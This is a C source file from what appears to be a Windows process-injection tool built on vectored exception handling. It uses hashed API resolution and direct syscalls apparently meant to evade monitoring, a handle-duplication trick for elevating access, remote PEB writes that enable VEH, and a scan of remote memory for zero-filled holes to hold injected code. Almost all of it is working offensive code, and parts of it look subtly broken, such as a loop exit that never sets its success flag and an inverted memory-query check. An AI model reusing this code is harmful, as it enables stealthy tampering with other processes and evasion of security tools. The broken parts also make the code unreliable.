#include "VEHinj.h"

#undef RtlCopyMemory

#ifdef DEBUG
size_t SFwcslen(const wchar_t* str)
{
	const wchar_t* p = str;
	while (*p)  // 当 *p != L'\0' 时继续
		p++;
	return (size_t)(p - str);
}
#endif

// 输出DEBUG字符串
void PrintDbgW(wchar_t* message) {
#ifdef DEBUG
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), message, (UINT)SFwcslen(message), NULL, NULL);
#endif
}

// 错误处理
void ErrExit() {
#ifdef DEBUG
	DbgBreakPoint();
#endif
	ExitProcess(0);
}

// 进程名转换PID
// Convert Process Name to PID
DWORD ConvertProcNameToPid(wchar_t* ProcName) {
	ULONG bufferSize = 1024 * 1024;
	PVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
	ULONG returnLength = 0;
	SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		typedef PVOID(NTAPI* pwcsstr)(const wchar_t* _Str, const wchar_t* _SubStr);
		pwcsstr SFwcsstr = (pwcsstr)SW3_GetSyscallAddress(0x15a4297);
		if (pInfo->ImageName.Buffer && SFwcsstr(pInfo->ImageName.Buffer, ProcName)) {
			DWORD pid = (DWORD)pInfo->UniqueProcessId;
			HeapFree(GetProcessHeap(), NULL, buffer);
			return pid;
		}
		if (pInfo->NextEntryOffset == 0) {
			break;
		}
		pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
	}
	HeapFree(GetProcessHeap(), NULL, buffer);
	return 0;
}

// 句柄提权漏洞 详见 https://github.com/codewhitesec/SysmonEnte/
// Handle Elevation Vulnerability
HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes) {
	HANDLE hDupPriv = NULL;
	HANDLE hHighPriv = NULL;
	ULONG options = 0;
	SFNtDuplicateObject((HANDLE)(LONG_PTR)-1, hProcess, (HANDLE)(LONG_PTR)-1, &hDupPriv, PROCESS_DUP_HANDLE, FALSE, 0);
	SFNtDuplicateObject(hDupPriv, (HANDLE)(LONG_PTR)-1, (HANDLE)(LONG_PTR)-1, &hHighPriv, DesiredAccess, HandleAttributes, options);
	return hHighPriv;
}

// 获取本地kernel32.dll入口点地址
// Obtain the entry point address of local kernel32.dll
PVOID GetLocalKernel32EntryPoint()
{
	PVOID DllBase = GetDllBase(0x6e72656b, 0x32336c65);
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
	PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)DllBase + DosHeader->e_lfanew);
	DWORD rva = NtHeaders->OptionalHeader.AddressOfEntryPoint;
	return (PVOID)((PBYTE)DllBase + rva);
}

// 更好的GetNtdllSectionVa函数 使用SW3函数找到NtDLL基址
// Better GetNtdllSectionVa function Using SW3 function to find NtDLL base address
BOOL GetNtdllSectionVa(DWORD SectionHash,
	PVOID* sectionVa,
	DWORD* sectionSize)
{
	PVOID ntdllBase = GetDllBase(0x6c64746e, 0x6c642e6c); // ntdll.dl的反写
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdllBase + dos->e_lfanew); // 解析NT头

	// 遍历section 匹配名字
	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
		DWORD Hash = HashString(sec->Name);
		if (Hash == SectionHash) {
			*sectionVa = (PVOID)((BYTE*)ntdllBase + sec->VirtualAddress);
			*sectionSize = sec->Misc.VirtualSize;
			return TRUE;
		}
	}

	return FALSE; // 未找到对应section
}

// 直接摘自PassTheHashBrowns的VectoredExceptionHandling项目 基本无修改
// Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
PVOID findLdrpVectorHandlerList(PVOID VEH)
{
	BOOL found = FALSE;

	PLIST_ENTRY next = ((PLIST_ENTRY)VEH)->Flink;

	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (GetNtdllSectionVa(0xd3bc39b6, &sectionVa, &sectionSz)) // 0xd3bc39b6 = .data
	{
		while ((PVOID)next != VEH)
		{
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID)((ULONG_PTR)sectionVa + sectionSz)) {
				break;
			}
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
				found = TRUE;
				break;
			}
			next = next->Flink;
		}
	}

	return found ? next : NULL;
}

// 直接摘自PassTheHashBrowns的VectoredExceptionHandling项目 基本无修改
// Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
BOOL EnableRemoteVEH(HANDLE hProcess) {
	PROCESS_BASIC_INFORMATION processInfo = { 0 };
	ULONG returnLength = 0;
	SFNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(processInfo), &returnLength);
	//Read the PEB from the remote process
	PEB2 peb_copy;
	SIZE_T bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		return FALSE;
	}
	//Enable VEH in our local copy and write it to the remote process
	peb_copy.u2.CrossProcessFlags = 0x4;
	SIZE_T bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesWritten);
	if (bytesWritten == 0) {
		return FALSE;
	}
	//Reread the remote PEB to ensure that we did enable VEH
	bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		return FALSE;
	}
	if (peb_copy.u2.CrossProcessFlags & 0x4) {
		return TRUE;
	}
	return FALSE;
}

// 扫描远程进程指定区域 查找满足对齐要求且长度为holeSize的连续零字节空洞
// Scan the specified area of the remote process to find a contiguous zero-byte hole that meets the alignment requirements and has a length of holeSize
PVOID FindZeroHoleInRemote(
	HANDLE hProcess, // 目标进程句柄
	PVOID regionBase, // 指定区域基址
	SIZE_T regionSize, // 指定区域长度
	SIZE_T holeSize, // 需求空洞长度
	SIZE_T alignment // 对齐要求
) {
	ULONG_PTR start = (ULONG_PTR)regionBase;
	ULONG_PTR end = start + regionSize;
	ULONG_PTR current = start;
	BYTE buffer[0x2000];
	SIZE_T bufferCap = sizeof(buffer);
	SIZE_T zeroRun = 0;
	ULONG_PTR zeroRunStart = 0;
	while (current < end) {
		// 查询当前页的保护 跳过只读页
		MEMORY_BASIC_INFORMATION mbi;
		SIZE_T qsz = 0;
		SFNtQueryVirtualMemory(hProcess, (PVOID)current, MemoryBasicInformation, &mbi, sizeof(mbi), &qsz);
		if (qsz == 0) {
			ULONG protect = mbi.Protect & 0xFF;
			if (!(protect == PAGE_READWRITE || protect == PAGE_EXECUTE_READWRITE || protect == PAGE_WRITECOPY || protect == PAGE_EXECUTE_WRITECOPY)) {
				current = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
				zeroRun = 0;
				continue;
			}
		}
		SIZE_T toRead = (SIZE_T)((end - current) < bufferCap ? (end - current) : bufferCap);
		SIZE_T bytesRead = 0;

		SFNtReadVirtualMemory(hProcess, (PVOID)current, buffer, toRead, &bytesRead);
		if (bytesRead == 0) {
			zeroRun = 0;
			current += toRead;
			continue;
		}
		for (SIZE_T i = 0; i < bytesRead; i++) {
			if (buffer[i] == 0) {
				if (zeroRun == 0) {
					zeroRunStart = current + i;
				}
				zeroRun++;

				if (zeroRun >= holeSize) {
					ULONG_PTR aligned = (zeroRunStart + (alignment - 1)) & ~(alignment - 1);
					ULONG_PTR coveredEnd = current + i + 1;
					if (aligned + holeSize <= coveredEnd) {
						return (PVOID)aligned;
					}
				}
			}
			else {
				zeroRun = 0;
			}
		}
		current += bytesRead;
	}
	return NULL; // Err: 未找到内存空洞
}
